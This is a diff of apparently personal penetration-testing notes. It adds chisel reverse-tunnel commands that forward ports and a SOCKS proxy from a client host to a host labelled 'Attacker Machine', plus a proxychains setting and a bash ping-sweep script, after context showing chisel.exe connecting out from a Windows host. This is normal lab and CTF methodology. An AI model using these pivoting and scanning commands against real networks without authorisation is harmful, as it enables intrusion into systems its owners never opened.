@@ -69,3 +69,31 @@ PS C:\temp> ./chisel.exe client 10.10.14.3:6969 R:socks
 2022/04/20 20:58:30 client: Connected (Latency 156.9076ms)
 
 
+================================================================
+================================================================
+
+
+Chisel
+# Chisel
+https://github.com/jpillora/chisel
+
+## Client Machine
+./chisel client 10.66.67.154:8000 R:25:127.0.0.1:25
+./chisel client 10.66.67.130:8000 R:8080:127.0.0.1:8080
+./chisel client 10.10.10.10:8001 R:1080:socks
+
+## Attacker Machine
+./chisel server -p 8000 --reverse
+
+# Add this in /etc/proxychains4.conf
+socks5 127.0.0.1 1080
+Ping Sweep
+#!/bin/bash
+
+for i in {1..255}; do 
+        if out=$(ping -c 1 10.10.10.$i); then
+                echo "$out" | grep ttl | cut -d " " -f4 | cut -d ":" -f1
+                echo "$out" | grep ttl | cut -d " " -f4 | cut -d ":" -f1 >> ip.txt
+        fi
+done
+
